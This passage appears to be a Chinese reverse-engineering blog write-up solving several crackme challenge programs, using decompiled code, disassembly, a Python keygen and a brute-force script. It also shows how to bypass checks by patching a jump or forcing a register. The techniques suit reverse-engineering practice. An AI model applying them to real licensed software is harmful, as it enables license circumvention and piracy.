ds:[rcx] ... add eax,0x1 \u6765\u9010\u5b57\u8282\u5730\u8fdb\u884c\u52a01\u3002 \u5de7\u5999\u5730\u5c06\u5730\u5740\u8d4b\u7ed9\u5bc4\u5b58\u5668\u540e\u52a0\u4e0a1\uff0c\u4ece\u800c\u5b9e\u73b0\u9010\u5b57\u8282\u7684\u529f\u80fd\u3002 \u600e\u4e48\u5b9e\u73b0\u7684\uff1f \u6bd4\u5982\u8bf4 [0x402220] \u7684\u5730\u5740\u6307\u5411 0x313233\u7684\u503c\u3002\u5730\u5740\u52a01\u540e\u53d8\u6210\u4e86[0x402221]\uff0c0x313233\u53d8\u6210\u4e860x323300\u3002\u5c31\u662f\u8bf4\u5c06\u7b2c\u4e00\u4e2a\u5b57\u8282\u79fb\u9664\u4e86 \u7528\u6237\u540d\u957f\u5ea6\u5c31\u662f\u5faa\u73af\u6b21\u6570\uff0c\u5faa\u73af\u5b8c\u6210\u540e\uff0c\u628a\u503c\u4f20\u7ed9rax\u3002 \u63a5\u7740\u4f7f\u7528strcmp\u6765\u6bd4\u8f83\u8ba1\u7b97\u524d\u548c\u8ba1\u7b97\u540e\u7684\u503c 000000000040111A | 48:8B4D 18 | mov rcx,qword ptr ss:[rbp+0x18] | \u63d0\u53d6rbp+0x18\u7684\u503c\u5230rcx\uff0c\u5c31\u662f\u539f\u59cb\u7528\u6237\u540d 000000000040111E | 49:89CB | mov r11,rcx | rcx:\"234\" 0000000000401121 | 49:89C2 | mov r10,rax | r10:\"234\" 0000000000401124 | 4C:89D1 | mov rcx,r10 | rcx:\"234\", r10:\"234\" 0000000000401127 | 4C:89DA | mov rdx,r11 | 000000000040112A | E8 B1020000 | call <JMP.&strcmp> | \u6bd4\u8f83rcx\u548crdx\uff0c\u539f\u59cb\u7528\u6237\u540d\u548c\u8ba1\u7b97\u540e\u7684\u503c \u76f8\u540c\u65f6rax\u4e3a0\uff0c\u4e0d\u540c\u65f6rax\u4e3a1\uff0c\u63a5\u7740\u5c06eax\u4e0e0\u6bd4\u8f83\uff0c\u5f39\u51fa\u54cd\u5e94\u7684\u63d0\u793a\u3002 \u4fee\u6539\u6700\u540e\u7684rax\u503c\u53ef\u4ee5\u5f3a\u5236\u6b63\u786e\u3002 \u9759\u6001 \u5165\u53e3\u51fd\u6570 void __noreturn start() { int v0; // eax int v1; // [rsp+4Ch] [rbp-4h] BYREF v1 = 0; _set_app_type(_crt_console_app); //\u8bbe\u7f6e\u7a0b\u5e8f\u7684\u542f\u52a8\u6a21\u5f0f\uff0cconsole\u6216gui controlfp(0x10000u, 0x30000u); //\u8bbe\u7f6e\u6d6e\u70b9\u6570\u7684\u63a7\u5236\u6a21\u5f0f _getmainargs(*(_QWORD *)&_argc, _argv, environ, (unsigned int)dword_402240, &v1); // \u83b7\u53d6\u53c2\u6570\u548c\u73af\u5883\u53d8\u91cf v0 = sub_401149((unsigned int)_argc, _argv, environ); exit(v0); } \u90a3\u4e48 sub_401149 \u51fd\u6570\u5c31\u662f\u4e3b\u51fd\u6570\u4e86\uff0c\u53cd\u7f16\u8bd1\u5982\u4e0b __int64 sub_401149() { FILE *v0; // rax \u6587\u4ef6\u7ed3\u6784\u4f53\u6307\u9488 FILE *v1; // rax \u6587\u4ef6\u7ed3\u6784\u4f53\u6307\u9488 char Str[32]; // [rsp+20h] [rbp-40h] BYREF char Buffer[32]; // [rsp+40h] [rbp-20h] BYREF printf(\"type in the username: \"); v0 = _iob_func(); fgets(Buffer, 32, v0); //\u4ece\u8f93\u5165\u4e2d\u8bfb\u53d6\uff0c\u5e76\u5b58\u50a8\u5230Buffer Buffer[strcspn(Buffer, Control)] = 0; //\u622a\u65ad\u5b57\u7b26\u4ee5\\0 printf(\"type in the password: \"); v1 = _iob_func(); fgets(Str, 32, v1); Str[strcspn(Str, asc_402045)] = 0; //\u540c\u4e0a if ( (unsigned int)sub_4010F8(Buffer, Str) ) printf(\"wrong!\"); else printf(\"correct!\"); return 0i64; } \u7a0b\u5e8f\u7684\u903b\u8f91\u5224\u65ad\u5728 sub_4010F8 \u51fd\u6570\u4e2d\uff0c\u4f20\u5165\u4e86Buffer(\u7528\u6237\u540d)\u548cStr(\u5bc6\u7801)\u53cd\u7f16\u8bd1\u5982\u4e0b _BOOL8 __fastcall sub_4010F8(__int64 a1, const char *a2) { const char *v2; // rax v2 = (const char *)sub_401048(a1); return strcmp(v2, a2) != 0; } \u4e00\u4e2abool\u7c7b\u578b\u51fd\u6570\uff0c\u63a5\u53d72\u4e2a\u53c2\u6570\u3002\u628a\u7ecf\u8fc7 sub_401048 \u51fd\u6570\u8ba1\u7b97\u7684a1(\u7528\u6237\u540d)\u8d4b\u7ed9\u4e86v2\uff0c\u7136\u540e\u6309\u5b57\u7b26\u4e32\u6bd4\u8f83v2\u548ca2\u662f\u5426\u4e3a0\u3002\u76f8\u540c\u65f6\u8fd4\u56defalse\uff0c\u4e0d\u540c\u8fd4\u56detrue\u3002 \u90a3 sub_401048 \u5c31\u662f\u8ba1\u7b97\u5bc6\u7801\u7684\u51fd\u6570\u4e86\u3002 char *__fastcall sub_401048(const char *a1) { int i; // [rsp+2Ch] [rbp-4h] if ( strcpy_s(Str, 0x20ui64, a1) ) //\u7528\u6237\u540d\u590d\u5236\u5230str\uff0c\u590d\u5236\u6210\u529f\u65f6 sub_401000(aStrcpySFailed); for ( i = 0; i < strlen(Str); ++i ) ++Str[i]; return Str; } \u53c8\u51fa\u73b0\u4e86\u4e00\u4e2a\u65b0\u51fd\u6570 sub_401000 \uff0c\u770b\u8d77\u6765\u5c31\u662f\u8f93\u51fa\u7528\u6237\u540d\uff0c\u7136\u540e\u9000\u51fa\u7a0b\u5e8f\u3002 \u5f53 strcpy_s \u590d\u5236\u5931\u8d25\u65f6\u4f1a\u8fd4\u56de\u975e0\u503c\uff0c\u4ece\u800c\u8fdb\u5165if\u4f53\u6267\u884c sub_401000 \u3002\u6b63\u5e38\u60c5\u51b5\u662f\u4e0d\u4f1a\u8fdb\u5165if\u7684\u3002 void __fastcall __noreturn sub_401000(const char *a1) { printf(\"%s\\n\", a1); exit(1); } \u63a5\u4e0b\u6765\u662f\u4e00\u4e2afor\u5faa\u73af\uff0c\u6839\u636estr\u7684\u957f\u5ea6\u6765\u5b9a\u4e49\u5faa\u73af\u6b21\u6570\uff0c\u6bcf\u6b21\u5faa\u73af\u90fd\u4f1a\u5c06str\u6570\u7ec4\u4e2d\u7684\u76f8\u5e94\u5143\u7d20\u8fdb\u884c+1\uff0c\u6700\u540e\u8fd4\u56deStr\u3002\u90a3\u4e48\u8fd9\u5c31\u662f\u5bc6\u7801\u7684\u4ea7\u751f\u65b9\u5f0f\u4e86 \u5bc6\u7801\u751f\u6210\u5668 username = input(\"username\uff1a\") password = \"\" for char in username: encrypted_char = chr(ord(char) + 1) password += encrypted_char print(\"password\uff1a\", password) Metamorphic crackme \u6253\u5f00\u7a0b\u5e8f\u8981\u6c42\u8f93\u5165key \u901a\u8fc7\u63d0\u793a\u7684\u5b57\u7b26\u4e32\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5230\u5224\u65ad\u7684\u5730\u65b9\uff0cjne\u5224\u65ad\u4e86test eax,eax\u7684\u7ed3\u679c\u3002\u4f46\u662ftest\u81ea\u8eab\u4e0d\u5c31\u662f\u6c38\u8fdc\u7b49\u4e8e\u5417? \u53ef\u4ee5\u5c06jne\u4fee\u6539\u4e3ajmp\u4f7f\u5176\u6c38\u8fdc\u8df3\u8f6c\u5230Success. \u4f46\u4f5c\u8005\u8ba9\u5199\u51fa\u4e00\u4e2a\u6ce8\u518c\u673a,\u6240\u4ee5\u4f9d\u65e7\u9700\u8981\u5206\u6790\u7a0b\u5e8f\u7684\u903b\u8f91\u3002 \u8fd9\u4e2a\u7a0b\u5e8f\u7528\u7684\u51fd\u6570\u6709\u70b9\u591a,\u5148\u770b\u770b\u53cd\u6c47\u7f16\u770b\u770b\u4ee3\u7801 \u5165\u53e3\u70b9\u51fd\u6570\u4f7f\u7528\u8fd4\u56de\u7684\u65b9\u5f0f\u52a0\u8f7d\u4e86\u51fd\u6570 sub_140001154() __int64 start() { unk_14002A0E0 = 0; return (unsigned int)sub_140001154(); } \u8fd9\u4e2a\u51fd\u6570 int __fastcall main(int argc, const char **argv, const char **envp) { PVOID v3; // rcx signed __int64 *v4; // rdx __int64 v5; // rdx __int64 v6; // rcx __int64 v7; // r8 __int64 v8; // r9 __int64 v10; // [rsp+20h] [rbp-50h] PVOID StackBase; // [rsp+58h] [rbp-18h] signed __int64 v12; // [rsp+60h] [rbp-10h] int v13; // [rsp+6Ch] [rbp-4h] StackBase = NtCurrentTeb()->NtTib.StackBase; //\u83b7\u53d6\u6808\u57fa\u5740 v13 = 0; while ( 1 ) { v3 = StackBase; //\u6808\u57fa\u5740\u7ed9\u4e86v3 v4 = &qword_14002ABB8; v12 = _InterlockedCompareExchange64(&qword_14002ABB8, (signed __int64)StackBase, 0i64); //\u786e\u4fdd\u57fa\u5740\u4e3aStackBase if ( !v12 ) break; if ( (PVOID)v12 == StackBase ) { v13 = 1; break; } Sleep(0x3E8u); //sleep 1000 } if ( unk_14002ABB0 == 1 ) sub_140011F70(31i64); if ( unk_14002ABB0 ) { dword_14002A024 = 1; } else { unk_14002ABB0 = 1; initterm(&qword_14002C018, qword_14002C028); } if ( unk_14002ABB0 == 1 ) { initterm(&qword_14002C000, &qword_14002C010); unk_14002ABB0 = 2; } //\u4e0a\u9762\u90fd\u662f\u5173\u4e8eIO\u6d41\u7684 if ( !v13 ) { v10 = 0i64; v4 = (signed __int64 *)_InterlockedExchange64(&qword_14002ABB8, 0i64); } //\u8fd9\u91cc\u7684\u5224\u65ad\u53ea\u67092\u4e2a\u53c2\u6570\uff0c\u5c06qword_14002ABB8\u66ff\u6362\u4e3a\u4e860i64\uff0c\u5e76\u4e14v4\u662fqword_14002ABB8\u539f\u59cb\u503c if ( TlsCallback_0 ) TlsCallback_0(0i64, 2i64, 0i64); //\u8bbe\u7f6e\u4e86TLScallback sub_140002FD8(v3, v4); qword_14002A120 = (__int64)SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)&loc_140003120); set_invalid_parameter_handler(Handler); sub_1400027D0(v6, v5, v7, v8, v10); sub_14000147C((unsigned int)dword_14002A004, &qword_14002A008); sub_140002567(); *(_QWORD *)off_140023120 = qword_14002A010; Code = sub_1400122A0((unsigned int)dword_14002A004, qword_14002A008, qword_14002A010); if ( !dword_14002A020 ) exit(Code); if ( !dword_14002A024 ) cexit(); return Code; } \u78b0\u5230\u4e00\u4e2a\u51fd\u6570 if ( unk_14002ABB0 == 1 ) sub_140011F70(31i64); void __fastcall __noreturn sub_140011F70(unsigned int a1) { FILE *v1; // rax v1 = _acrt_iob_func(2u); sub_140011DB0(v1, \"runtime error %d\\n\", a1); exit(255); } __int64 sub_140011DB0(FILE *a1, const char *a2, ...) { va_list va; // [rsp+60h] [rbp+20h] BYREF va_start(va, a2); return (unsigned int)_stdio_common_vfprintf(0i64, a1, a2, 0i64, va); } \u5927\u6982\u662f\u5224\u65adIO\u6d41\u7684\u4ee3\u7801\u3002 __int64 sub_140002FD8() { __int64 result; // rax void *v1; // rsp char v2; // [rsp+20h] [rbp-10h] BYREF int v3; // [rsp+2Ch] [rbp-4h] result = (unsigned int)dword_14002A0FC; if ( !dword_14002A0FC ) { dword_14002A0FC = 1; v3 = sub_14000387B(); v1 = alloca(sub_140003B00()); //\u5206\u914d\u6808\u7a7a\u95f4\uff0c4k\u5bf9\u9f50 qword_14002A0F0 = (__int64)&v2; dword_14002A0F8 = 0; sub_140002C4E(&unk_1400263F0, &unk_1400263F0, off_1400251F0); return sub_140002B2F(); } return result; } __int64 sub_14000387B() { if ( (unsigned int)sub_140003650(off_1400251F0) ) return *(unsigned __int16 *)((char *)off_1400251F0 + *((int *)off_1400251F0 + 15) + 6); else return 0i64; } _BOOL8 __fastcall sub_140003650(__int64 a1) { __int64 v2; // [rsp+10h] [rbp-10h] if ( *(_WORD *)a1 != 23117 ) return 0i64; v2 = *(int *)(a1 + 60) + a1; //v2\u7b49\u4e8e23117+60+23117 = 46294 return *(_DWORD *)v2 == 17744 && *(_WORD *)(v2 + 24) == 523; } \u5173\u952e\u51fd\u6570 __int64 sub_1400122A0() { __int64 v1[3]; // [rsp+20h] [rbp-D8h] BYREF __int64 v2; // [rsp+38h] [rbp-C0h] BYREF char v3[184]; // [rsp+40h] [rbp-B8h] BYREF sub_140002567(); printf(\"Input Key:\\n\"); v1[1] = 0xFFEEDDCCBBAA9988ui64; v1[0] = 0x7766554433221100i64; sub_140001C70(v1, v3); sub_140001720(\"%llu\", &v2); if ( (unsigned int)sub_140001760(v3, v2) ) printf(\"Success!\\n\"); else printf(\"Fail\\n\"); return 0i64; } \u7528\u4e8e\u5224\u65ad\u7684\u51fd\u6570\uff0c\u8fd4\u56de\u4e86\u4e00\u4e2a\u5730\u5740 __int64 __fastcall sub_140001760(__int64 a1, __int64 a2) { char *v4; // rbx __int64 v5; // r13 char *v6; // rcx DWORD *v7; // rax __int64 (__fastcall *Address[60])(__int64, __int64); // [rsp+20h] [rbp-218h] BYREF char v10; // [rsp+200h] [rbp-38h] BYREF qmemcpy(Address, &unk_140024068, sizeof(Address)); v4 = (char *)Address; v5 = sub_1400024A0(); do { v6 = v4; v4 += 16; sub_140001B40(v6, a1); } while ( v4 != &v10 ); v7 = (DWORD *)malloc(8ui64); VirtualProtect(Address, 0x1E0ui64, 0x40u, v7); return Address[0](a2 ^ 0x11223344332211i64, v5); } \u8fd9\u4e2a\u52a0\u5bc6\u7a0b\u5e8f\u4ece\u5934\u5230\u5c3e\u90fd\u662f\u62ff\u5730\u5740\u8fdb\u884c\u8ba1\u7b97\uff0c\u4e14\u4f3c\u4e4e\u6709\u4e00\u4e2a\u5bc6\u94a5\u81ea\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7b97\u6cd5\u7528\u4e8e\u52a0\u5bc6\u3002 \u8fd9\u9898\u5bf9\u4e8e\u4e00\u4e2a\u521d\u5b66\u8005\u800c\u8a00\u4f3c\u4e4e\u6709\u4e9b\u8d85\u7eb2\u3002 \u5728https://github.com/forentfraps/metamorphic-crackme/\u627e\u5230\u4e86\u7591\u4f3c\u7684\u6e90\u4ee3\u7801 objectiveSquid's Christmas Crackme \u7a0b\u5e8f\u754c\u9762 \u628a\u5bc6\u7801\u62ff\u51fa\u6765\u548c\u8f93\u5165\u6bd4\u8f83\u4e86\uff0c\u76f4\u63a5\u53ef\u4ee5\u770b\u5230\u660e\u6587\u5bc6\u7801 \u53cd\u6c47\u7f16\u770b\u6e90\u4ee3\u7801\u8fc7\u4e8e\u7b80\u5355 int __cdecl main(int argc, const char **argv, const char **envp) { char Str2[9]; // [esp+14h] [ebp-3Ch] BYREF char Str1[51]; // [esp+1Dh] [ebp-33h] BYREF __main(); strcpy(Str2, \"Santa123\"); puts(\"Please enter the secret password to open santas gift-vault:\"); scanf(\"%50s\", Str1); if ( !strcmp(Str1, Str2) ) puts(\"\\nHOORAY! You saved christmas, what a bad password! How could he have forgotten it??\"); else puts(\"\\nWrong key :(\\nBetter luck next time!\"); _getch(); return 0; } hellokittyfan47's hellokittyfan's crackme \u8fd9\u4e2a\u7a0b\u5e8f\u6ca1\u6709\u9519\u8bef\u63d0\u793a\uff0c\u627e\u5b57\u7b26\u4e32\u4e5f\u6ca1\u6709\u6b63\u786e\u63d0\u793a\u3002 \u4f5c\u8005\u8bf4\u6b63\u786e\u683c\u5f0f\u662f10\u4e2a\u6570\u5b57 int __fastcall main(int argc, const char **argv, const char **envp) { int *v3; // rax int *v4; // rbx const char *v5; // rdi int v6; // eax char *v7; // rcx char *EndPtr; // [rsp+20h] [rbp-48h] BYREF __int16 v10[4]; // [rsp+28h] [rbp-40h] BYREF char *String_input[2]; // [rsp+30h] [rbp-38h] BYREF __int64 v12; // [rsp+40h] [rbp-28h] unsigned __int64 v13; // [rsp+48h] [rbp-20h] *(_OWORD *)String_input = 0i64; v12 = 0i64; v13 = 15i64; LOBYTE(String_input[0]) = 0; do { do { print(std::cout, (__int64)\"Enter your key: \"); scanf(std::cin, String_input); } while ( !(unsigned __int8)sub_140001290((char *)String_input) ); v3 = errno(); v4 = v3; v5 = (const char *)String_input; if ( v13 >= 0x10 ) v5 = String_input[0]; *v3 = 0; v6 = strtol(v5, &EndPtr, 10); if ( v5 == EndPtr ) { std::_Xinvalid_argument(\"invalid stoi argument\"); JUMPOUT(0x1400014ACi64); } if ( *v4 == 34 ) { std::_Xout_of_range(\"stoi argument out of range\"); __debugbreak(); } } while ( ~(((2 * v6) >> 20) & 0xFFFFFF80 ^ 0x269A) != 9573 || !v6 ); LODWORD(EndPtr) = 1685024615; qmemcpy(v10, \"job\", 3); print(std::cout, (__int64)&EndPtr); print(std::cout, (__int64)v10); if ( v13 >= 0x10 ) { v7 = String_input[0]; if ( v13 + 1 >= 0x1000 ) { v7 = (char *)*((_QWORD *)String_input[0] - 1); if ( (unsigned __int64)(String_input[0] - v7 - 8) > 0x1F ) invalid_parameter_noinfo_noreturn(); } j_j_free(v7); } return 0; } sub_140001290\u51fd\u6570\uff0c\u662f\u4e00\u4e2a\u5224\u65ad\uff0c\u8ddf\u8fd0\u7b97\u903b\u8f91\u65e0\u5173 char __fastcall sub_140001290(char *String) { int *v2; // rax int *v3; // rdi char *EndPtr; // [rsp+20h] [rbp-28h] BYREF v2 = errno(); v3 = v2; if ( *((_QWORD *)String + 3) >= 0x10ui64 ) String = *(char **)String; *v2 = 0; strtol(String, &EndPtr, 10); if ( String == EndPtr ) std::_Xinvalid_argument(\"invalid stoi argument\"); if ( *v3 == 34 ) std::_Xout_of_range(\"stoi argument out of range\"); return 1; } loc_140001360 \u8fd9\u662fwhile\u5faa\u73af\u7684\u4e00\u90e8\u5206\uff0c\u8c03\u7528\u4e86sub_140001620\u3001sub_1400017F0\u548csub_140001290 \u51fd\u6570\uff0c\u8fd9\u90fd\u662f\u5bf9\u8f93\u5165\u7684\u68c0\u6d4b loc_140001360: lea rdx, aEnterYourKey ; \"Enter your key: \" mov rcx, cs:?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::basic_ostream<char,std::char_traits<char>> std::cout call sub_140001620 lea rdx, [rsp+68h+String] mov rcx, cs:?cin@std@@3V?$basic_istream@DU?$char_traits@D@std@@@1@A ; std::basic_istream<char,std::char_traits<char>> std::cin call sub_1400017F0 lea rcx, [rsp+68h+String] ; String call sub_140001290 test al, al jz short loc_140001360 \u7ee7\u7eed\u5f80\u4e0b\u53ef\u4ee5\u8ddf\u5230\u8fd9\u7247\u4ee3\u7801\uff0c\u7ecf\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\uff0cecx\u548c2565h\u6bd4\u8f83\u540e\u6839\u636e\u8df3\u8f6c\u662f\u5426\u91cd\u56de\u5faa\u73af\u3002 lea ecx, [rax+rax] //\u76f8\u5f53\u4e8ex2 sar ecx, 14h //\u53f3\u79fb20\u4f4d and ecx, 0FFFFFF80h //\u4e0e0x0FFFFFF80 and\u8ba1\u7b97 xor ecx, 269Ah //\u4e0e0x269A xor\u8ba1\u7b97 not ecx //\u975e\u8ba1\u7b97 cmp ecx, 2565h jnz loc_140001360 \u6240\u4ee5\u53cd\u63a8\u5230\u539f\u59cb\u503c\u5c31\u662f\u6b63\u786e\u7684key\u3002 not 2565h \uff0c\u5f97\u52300xffffda9a 0xffffda9a xor 0x269A\uff0c\u5f97\u5230 0xfffffc00 \u8fd9\u91ccand\u5c31\u6709\u70b9\u9ebb\u70e6\u4e86\uff0c\u56e0\u4e3a\u539f\u59cb\u503c\u7684\u4f4e\u4f4d\u53ef\u80fd\u67091 0\u4f4d\u53ef\u80fd\u662f1\uff0c\u5728\u4e0e0x0FFFFFF80 and\u540e\u4e3a0\u3002 for i in range(1, 10000000000): tmp = i + i if (tmp & 0xC0000000 == 0xC0000000) and ((tmp >> 20 & 0xFF) < 0x80): print(i) \u5bc6\u7801\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u80fd\u8dd1\u51fa\u8f83\u5927\u7684\u5bc6\u7801\u8303\u56f4 saderiek's crackme main\u51fd\u6570 // write access to const memory has been detected, the output may be wrong! int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // eax int v5; // [esp+Ch] [ebp-1Ch] v5 = 100; while ( v5 ) { print(\"Enter the pass: \"); sub_401430(\"%14s\", aBcbHbnJa1qw); sub_401190(); if ( v3 ) v5 = 0; else dword_414160 = 1; } return 0; } .data:0041B001 aPbBfbwfjb12 db 'Pb@#bfbwfjb12',0 .data:0041B00F align 10h .data:0041B010 byte_41B010 db 6Ah ; DATA XREF: sub_401130+3A\u2191w .data:0041B010 ; sub_401130+4A\u2191w ... .data:0041B011 aU129 db '*u@129',0 .data:0041B018 byte_41B018 db 30h ; DATA XREF: sub_401190+CE\u2191w .data:0041B018 ; sub_401190+DE\u2191w ... .data:0041B019 aIDswq db 'i#Dswq',0 .data:0041B020 aBcbHbnJa1qw db 'bcb&*hbn,ja1qw',0 int sub_401430(const char *a1, ...) { int v1; // eax va_list va; // [esp+14h] [ebp+Ch] BYREF va_start(va, a1); v1 = sub_403CAC(0); return sub_401400(v1, a1, 0, va); } \u5faa\u73afloc_40136D \u4e3b\u4f53\u5faa\u73af .text:0040136D loc_40136D: ; CODE XREF: _main:loc_4013CE\u2193j .text:0040136D cmp [ebp+var_1C], 0 .text:00401371 jz short loc_4013D0 .text:00401373 push offset aEnterThePass ; \"Enter the pass: \" .text:00401378 call sub_403DEA .text:0040137D add esp, 4 .text:00401380 push offset aBcbHbnJa1qw ; \"bcb&*hbn,ja1qw\" .text:00401385 push offset a14s ; \"%14s\" .text:0040138A call sub_401430 .text:0040138F add esp, 8 .text:00401392 mov [ebp+ms_exc.registration.TryLevel], 0 .text:00401399 call sub_401190 .text:0040139E test eax, eax .text:004013A0 jz short loc_4013AB .text:004013A2 mov [ebp+var_1C], 0 .text:004013A9 jmp short loc_4013B5 .text:004013AB ; --------------------------------------------------------------------------- .text:00401371 jz short loc_4013D0 \u8fd9\u662f\u6b63\u786e\u65f6\u7684\u8df3\u8f6c\uff0c\u8df3\u5230loc_4013D0 .text:004013D0 loc_4013D0: ; CODE XREF: _main+31\u2191j .text:004013D0 xor eax, eax .text:004013D2 mov ecx, [ebp+ms_exc.registration.Next] .text:004013D5 mov large fs:0, ecx .text:004013DC pop edi .text:004013DD pop esi .text:004013DE pop ebx .text:004013DF mov esp, ebp .text:004013E1 pop ebp .text:004013E2 retn .text:004013E2 _main endp \u8f93\u5165\u5bc6\u7801\u540e\u7b2c\u4e00\u4e2a\u8c03\u7684\u51fd\u6570\u51fd\u6570sub_403DEA .text:00403DEA sub_403DEA proc near ; CODE XREF: sub_401190+65\u2191p .text:00403DEA ; sub_401190+136\u2191p ... .text:00403DEA .text:00403DEA var_20 = dword ptr -20h .text:00403DEA var_1C = dword ptr -1Ch .text:00403DEA var_18 = dword ptr -18h .text:00403DEA var_14 = dword ptr -14h .text:00403DEA var_10 = dword ptr -10h .text:00403DEA var_C = dword ptr -0Ch .text:00403DEA var_8 = dword ptr -8 .text:00403DEA var_1 = byte ptr -1 .text:00403DEA arg_0 = dword ptr 8 .text:00403DEA .text:00403DEA mov edi, edi .text:00403DEC push ebp .text:00403DED mov ebp, esp .text:00403DEF sub esp, 20h .text:00403DF2 cmp [ebp+arg_0], 0 .text:00403DF6 jnz short loc_403E0D .text:00403DF8 call sub_40A2BB .text:00403DFD mov dword ptr [eax], 16h .text:00403E03 call sub_40A1FE .text:00403E08 or eax, 0FFFFFFFFh .text:00403E0B leave .text:00403E0C retn .text:00403E0D ; --------------------------------------------------------------------------- \u7b2c\u4e8c\u4e2a\u8c03\u7684\u51fd\u6570sub_401430 text:00401430 sub_401430 proc near ; CODE XREF: _main+4A\u2191p .text:00401430 .text:00401430 var_8 = dword ptr -8 .text:00401430 var_4 = dword ptr -4 .text:00401430 arg_0 = dword ptr 8 .text:00401430 arg_4 = byte ptr 0Ch .text:00401430 .text:00401430 push ebp .text:00401431 mov ebp, esp .text:00401433 sub esp, 8 .text:00401436 lea eax, [ebp+0Ch] .text:00401439 mov [ebp-4], eax .text:0040143C mov ecx, [ebp-4] .text:0040143F push ecx .text:00401440 push 0 .text:00401442 mov edx, [ebp+8] .text:00401445 push edx .text:00401446 push 0 .text:00401448 call sub_403CAC .text:0040144D add esp, 4 .text:00401450 push eax .text:00401451 call sub_401400 .text:00401456 add esp, 10h .text:00401459 mov [ebp-8], eax .text:0040145C mov dword ptr [ebp-4], 0 .text:00401463 mov eax, [ebp-8] .text:00401466 mov esp, ebp .text:00401468 pop ebp .text:00401469 retn .text:00401469 sub_401430 endp winapiadmin's ROT13 crackme \u7a0b\u5e8f\u754c\u9762 \u5173\u952e\u5bf9\u6bd4\uff0crax\u7684\u503c\u56fa\u5b9a\u4e3a0x152A\u3002\u6240\u4ee5\u8fd9\u4e2akey\u662f5418 \u7a0b\u5e8f\u903b\u8f91 __int64 start() { int v0; // eax __int64 v2; // [rsp+28h] [rbp-30h] char Buffer[32]; // [rsp+38h] [rbp-20h] BYREF sub_140001220(\"Enter Key:\"); gets_s(Buffer, 9ui64); v2 = atoi64(Buffer); sub_1400010C0(); v0 = rand(); sub_140001040(qword_140003000[v0 % 13]); if ( sub_1400010C0() == v2 ) sub_140001220(\"Correct!\\n\"); else sub_140001220(\"Please, try again\\n\"); system(\"pause\"); return 0i64; } \u8ba1\u7b97key\u7684\u5173\u952e\u4ee3\u7801 __int64 sub_1400010C0() { int v0; // eax v0 = rand(); return qword_140003000[sub_140001040(14 * (v0 % 14 + 1)) % 0xDui64]; } __int64 __fastcall sub_140001040(unsigned __int64 a1) { return (16 * ((((a1 >> 4) & 0xF0F0F0F0F0F0F0Fi64) + 13) & 0xF0F0F0F0F0F0F0Fi64)) | ((a1 & 0xF0F0F0F0F0F0F0Fi64) + 13) & 0xF0F0F0F0F0F0F0Fi64; } winapiadmin's XOR crackmes \u7a0b\u5e8f\u754c\u9762 \u5173\u952e\u903b\u8f91 .text:0000000140001135 mov rcx, [rsp+30h] .text:000000014000113A cmp [rsp+rax+48h], rcx .text:000000014000113F jnz short loc_14000114F .text:0000000140001141 lea rcx, aCorrect ; \"Correct!\\n\" Trappy Crack me \u7a0b\u5e8f\u754c\u9762 \u641c\u7d22\u5b57\u7b26\u4e32\uff0c\u5b9a\u4f4d\u5230\u8df3\u8f6c\u5173\u952e\u4f4d\u7f6e \u8fd9\u91cc\u6709\u4e24\u6b21jne\uff0c\u90fd\u8df3\u8fc7\u4e86\u6b63\u786e\u63d0\u793a\u5e76\u4e14\u8df3\u5f80\u540c\u4e00\u4e2a\u4f4d\u7f6e\u3002\u6240\u4ee5\u8fd9\u91cc\u662f\u67092\u4e2a\u6761\u4ef6\u7684\u5224\u65ad\u7684\u3002 \u67e5\u770b\u53cd\u7f16\u8bd1\u4ee3\u7801\uff0c\u6709\u4e00\u4e2aand\u5224\u65ad\u3002size == v67 \uff0c\u8fd9\u4e2av67\u5e94\u8be5\u5c31\u662frbp-0x60\u5904\u7684\u503c \u8f93\u51651\uff0crbp-0x60\u6808\u4e0a\u7684\u503c\u662f5,r8\u662f1\u3002\u53ef\u731c\u5230\u5e94\u8be5\u662f\u5224\u65ad\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\uff0c\u7a0b\u5e8f\u89c4\u5b9akey\u957f\u5ea6\u662f5\u3002 \u63a5\u7740\u6bd4\u8f83key\u7684\u503c\uff0c\u7a0b\u5e8f\u7528\u4e86memcmp\u51fd\u6570\u6bd4\u8f83\u7b2c\u4e00\u4e2a\u53c2\u6570\u548c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u524dn\u4e2a\u5b57\u8282 int memcmp(const void *s1, const void *s2, size_t n); memcmp\u8c03\u7528\u5982\u56fe\uff0c\u65e0\u9700\u5173\u5fc3\u51fd\u6570\u5b9e\u73b0\u65b9\u5f0f\uff0c\u53ea\u9700\u8981\u770brcx\u3001rdx\u7684\u503c\u3002 rcx\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e3a11111\uff0c\u8f93\u5165\u7684\u5bc6\u7801 rdx\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4e3a+1TP3\uff0c\u6b63\u786e\u7684\u5bc6\u7801 r8\u662f\u6bd4\u8f83\u7684\u5b57\u8282\u6570\u3002 s4r's heaven.exe \u7a0b\u5e8f\u754c\u9762 \u5b9a\u4f4d\u5b57\u7b26\u4e32\u627e\u5230\u4e3b\u8981\u51fd\u6570 \u5c06\u8f93\u5165\u7684\u5bc6\u7801\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u7ed9\u4e86strlen\uff0c\u7136\u540e\u5c06strlen\u7684\u8fd4\u56de\u503c\u4e0e0x1d\u6bd4\u8f83\u3002\u53ef\u4ee5\u77e5\u9053\u5bc6\u7801\u7684\u957f\u5ea6\u5c31\u662f0x1d\uff0c\u4e5f\u5c31\u662f29\u3002 .text:00000000004015FF mov r8, rax ; Stream .text:0000000000401602 mov edx, 1Fh ; MaxCount .text:0000000000401607 lea rax, Buffer .text:000000000040160E mov rcx, rax ; Buffer .text:0000000000401611 call fgets .text:0000000000401616 lea rax, Buffer .text:000000000040161D mov rcx, rax ; Str .text:0000000000401620 call strlen .text:0000000000401625 mov [rbp-4], eax .text:0000000000401628 cmp dword ptr [rbp-4], 1Dh .text:000000000040162C jz short loc_401635 .text:000000000040162E call sub_401591 //\u63d0\u793anop\u6d41\u7a0b .text:0000000000401633 jmp short loc_401667 